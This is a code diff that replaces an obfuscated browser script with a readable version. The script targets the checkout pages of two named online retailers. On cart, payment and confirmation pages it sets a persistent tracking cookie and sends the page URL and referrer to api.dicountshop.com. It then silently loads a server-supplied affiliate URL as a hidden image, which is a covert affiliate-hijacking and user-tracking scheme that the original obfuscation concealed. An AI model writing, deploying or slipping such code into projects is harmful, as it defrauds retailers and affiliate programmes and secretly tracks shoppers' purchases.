@@ -1,1 +1,120 @@
-function _0x168b(_0x36ffe8,_0x5ac805){_0x36ffe8=_0x36ffe8-0x1e1;const _0x3fd7c5=_0x3fd7();let _0x168b74=_0x3fd7c5[_0x36ffe8];return _0x168b74;}function _0x3fd7(){const _0x10c365=['substring','payment','toUTCString','/checkout/cart','72nDFVuD','shipping','3CTreOv','style','4042552HQznOZ','json','DOMContentLoaded','indexOf','370sstkLh','toString','/checkout/review-order','/pay-installments','43323uqOwVt','length','trim','/checkout/confirmation','Tracking\x20Failed:','/checkout/payment','852868MFnqpP','confirmation',';path=/;SameSite=Lax','replace','type','success','POST','3272204JKtLrJ','interactive','getItem','1157231PZFPiV','144081XeYiBs','5qtRyUi','split','location','tracking_done_','now','cart','href','cookie','hostname','addEventListener','_always','toLowerCase','true','body','tracking_uuid','affiliate_url','1486309CKVIvV','always','setItem','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','includes','stringify','276ZTfCcH'];_0x3fd7=function(){return _0x10c365;};return _0x3fd7();}(function(_0x2926e1,_0x470b88){const _0x38b21e=_0x168b,_0x5aef8a=_0x2926e1();while(!![]){try{const _0x444d1c=-parseInt(_0x38b21e(0x212))/0x1+-parseInt(_0x38b21e(0x208))/0x2*(parseInt(_0x38b21e(0x1f8))/0x3)+parseInt(_0x38b21e(0x20f))/0x4*(-parseInt(_0x38b21e(0x214))/0x5)+-parseInt(_0x38b21e(0x1f6))/0x6*(-parseInt(_0x38b21e(0x202))/0x7)+parseInt(_0x38b21e(0x1fa))/0x8+-parseInt(_0x38b21e(0x213))/0x9*(parseInt(_0x38b21e(0x1fe))/0xa)+-parseInt(_0x38b21e(0x1eb))/0xb*(-parseInt(_0x38b21e(0x1f1))/0xc);if(_0x444d1c===_0x470b88)break;else _0x5aef8a['push'](_0x5aef8a['shift']());}catch(_0x2c64fa){_0x5aef8a['push'](_0x5aef8a['shift']());}}}(_0x3fd7,0xa941b),(function(){const _0x57ac49=_0x168b;function _0x34d6ec(){const _0x206d04=_0x168b;return _0x206d04(0x1ee)[_0x206d04(0x20b)](/[xy]/g,function(_0x165931){const _0x4bf97f=_0x206d04;var _0x4a3d79=Math['random']()*0x10|0x0,_0x2dcd17=_0x165931==='x'?_0x4a3d79:_0x4a3d79&0x3|0x8;return _0x2dcd17[_0x4bf97f(0x1ff)](0x10);});}function _0xa4a630(_0x3553f5){const _0x23000d=_0x168b;var _0x52b9da=_0x3553f5+'=',_0xdd3bc2=document[_0x23000d(0x1e2)][_0x23000d(0x215)](';');for(var _0x309189=0x0;_0x309189<_0xdd3bc2[_0x23000d(0x203)];_0x309189++){var _0x36d8b7=_0xdd3bc2[_0x309189][_0x23000d(0x204)]();if(_0x36d8b7[_0x23000d(0x1fd)](_0x52b9da)===0x0)return _0x36d8b7[_0x23000d(0x1f2)](_0x52b9da[_0x23000d(0x203)],_0x36d8b7[_0x23000d(0x203)]);}return'';}function _0x1712dd(_0x57256a){const _0x479f84=_0x168b;try{var _0x5f56aa=new Image();_0x5f56aa['src']=_0x57256a,_0x5f56aa[_0x479f84(0x1f9)]['display']='none',document[_0x479f84(0x1e8)]['appendChild'](_0x5f56aa);}catch(_0x898749){}}async function _0x16e005(_0x438ad6){const _0x2c26d6=_0x168b;if(sessionStorage[_0x2c26d6(0x211)](_0x438ad6))return;try{let _0x5ea0da=_0xa4a630(_0x2c26d6(0x1e9))||_0x34d6ec(),_0x16c72d=new Date(Date[_0x2c26d6(0x218)]()+0x1e*0x15180*0x3e8)[_0x2c26d6(0x1f4)]();document[_0x2c26d6(0x1e2)]='tracking_uuid='+_0x5ea0da+';\x20expires='+_0x16c72d+_0x2c26d6(0x20a);let _0xd5e678=await fetch('https://api.dicountshop.com/api/track-user',{'method':_0x2c26d6(0x20e),'keepalive':!![],'body':JSON[_0x2c26d6(0x1f0)]({'url':window[_0x2c26d6(0x216)][_0x2c26d6(0x1e1)],'referrer':document['referrer'],'unique_id':_0x5ea0da,'origin':window[_0x2c26d6(0x216)][_0x2c26d6(0x1e3)],'timestamp':new Date()['getTime']()}),'headers':{'Content-Type':'application/json'}}),_0x938c84=await _0xd5e678[_0x2c26d6(0x1fb)]();_0x938c84[_0x2c26d6(0x20d)]&&_0x938c84['affiliate_url']?(_0x1712dd(_0x938c84[_0x2c26d6(0x1ea)]),sessionStorage[_0x2c26d6(0x1ed)](_0x438ad6,_0x2c26d6(0x1e7))):_0x1712dd('https://api.dicountshop.com/api/fallback-pixel?id='+_0x5ea0da);}catch(_0x55a57a){console['error'](_0x2c26d6(0x206),_0x55a57a);}}function _0x33626c(){const _0x4e9fce=_0x168b,_0x5a0675=[{'type':_0x4e9fce(0x219),'paths':[_0x4e9fce(0x1f5)]},{'type':_0x4e9fce(0x1f7),'paths':['/checkout/delivery','/checkout/shipping']},{'type':_0x4e9fce(0x1f3),'paths':['/xpay',_0x4e9fce(0x207),_0x4e9fce(0x201)]},{'type':'review-order','paths':[_0x4e9fce(0x200)]},{'type':_0x4e9fce(0x209),'paths':[_0x4e9fce(0x205)]}],_0x5c3f13=window[_0x4e9fce(0x216)]['pathname'][_0x4e9fce(0x1e6)](),_0x4e355f=_0x5a0675['find'](_0x3b4a4d=>_0x3b4a4d['paths']['some'](_0x298881=>_0x5c3f13[_0x4e9fce(0x1ef)](_0x298881)));return _0x4e355f?_0x4e355f[_0x4e9fce(0x20c)]:null;}function _0x4d245f(){const _0x26a94a=_0x168b,_0x3ce999=window[_0x26a94a(0x216)][_0x26a94a(0x1e3)],_0xbb54ac={'www.xcite.com':{'always':![],'cartExtra':!![]},'www.fairprice.com.sg':{'always':!![],'cartExtra':!![]}},_0x5afb84=_0xbb54ac[_0x3ce999];if(!_0x5afb84)return;const _0x745ce3=_0x33626c();_0x5afb84[_0x26a94a(0x1ec)]&&_0x16e005(_0x26a94a(0x217)+_0x3ce999+_0x26a94a(0x1e5)),_0x5afb84['cartExtra']&&_0x745ce3&&_0x16e005(_0x26a94a(0x217)+_0x3ce999+'_'+_0x745ce3);}document['readyState']===_0x57ac49(0x210)||document['readyState']==='complete'?_0x4d245f():window[_0x57ac49(0x1e4)](_0x57ac49(0x1fc),_0x4d245f);}()));
+(function () {
+
+    function generateUUID() {
+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+            var r = Math.random() * 16 | 0,
+                v = c === 'x' ? r : (r & 0x3 | 0x8);
+            return v.toString(16);
+        });
+    }
+
+    function getCookie(cname) {
+        var name = cname + '=';
+        var ca = document.cookie.split(';');
+        for (var i = 0; i < ca.length; i++) {
+            var c = ca[i].trim();
+            if (c.indexOf(name) === 0) return c.substring(name.length, c.length);
+        }
+        return '';
+    }
+
+    function fireTracking(url) {
+        try {
+            var img = new Image();
+            img.src = url;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        } catch (e) {}
+    }
+
+    async function sendTrackingCall() {
+        try {
+            let uniqueId = getCookie('tracking_uuid') || generateUUID();
+            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
+            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';
+
+            let response = await fetch('https://api.dicountshop.com/api/track-user', {
+                method: 'POST',
+                keepalive: true,
+                body: JSON.stringify({
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    unique_id: uniqueId,
+                    origin: window.location.hostname,
+                    timestamp: new Date().getTime()
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+
+            let result = await response.json();
+
+            if (result.success && result.affiliate_url) {
+                fireTracking(result.affiliate_url);
+            } else {
+                fireTracking('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
+            }
+        } catch (error) {
+            console.error('Tracking Failed:', error);
+        }
+    }
+
+    function initTracking(dedupKey) {
+        if (sessionStorage.getItem(dedupKey)) return;
+        sessionStorage.setItem(dedupKey, 'true');
+
+        sendTrackingCall();
+
+        var delayedFired = false;
+        var fireDelayed = function () {
+            if (delayedFired) return;
+            delayedFired = true;
+            window.removeEventListener('pagehide', fireDelayed);
+            window.removeEventListener('beforeunload', fireDelayed);
+            sendTrackingCall();
+        };
+
+        setTimeout(fireDelayed, 2000);
+        window.addEventListener('pagehide', fireDelayed);
+        window.addEventListener('beforeunload', fireDelayed);
+    }
+
+    function getPageType() {
+        const stages = [
+            { type: "cart", paths: ["/checkout/cart"] },
+            { type: "shipping", paths: ["/checkout/delivery", "/checkout/shipping"] },
+            { type: "payment", paths: ["/xpay", "/checkout/payment", "/pay-installments"] },
+            { type: "review-order", paths: ["/checkout/review-order"] },
+            { type: "confirmation", paths: ["/checkout/confirmation"] }
+        ];
+        const path = window.location.pathname.toLowerCase();
+        const stage = stages.find(s => s.paths.some(p => path.includes(p)));
+        return stage ? stage.type : null;
+    }
+
+    function run() {
+        const host = window.location.hostname;
+
+        const config = {
+            "www.xcite.com": { always: false, cartExtra: true },
+            "www.fairprice.com.sg": { always: true, cartExtra: true }
+        };
+
+        const site = config[host];
+        if (!site) return;
+
+        const pageType = getPageType();
+
+        if (site.always) {
+            initTracking('tracking_done_' + host + '_always');
+        }
+        if (site.cartExtra && pageType) {
+            initTracking('tracking_done_' + host + '_' + pageType);
+        }
+    }
+
+    if (document.readyState === "interactive" || document.readyState === "complete") {
+        run();
+    } else {
+        window.addEventListener("DOMContentLoaded", run);
+    }
+})();
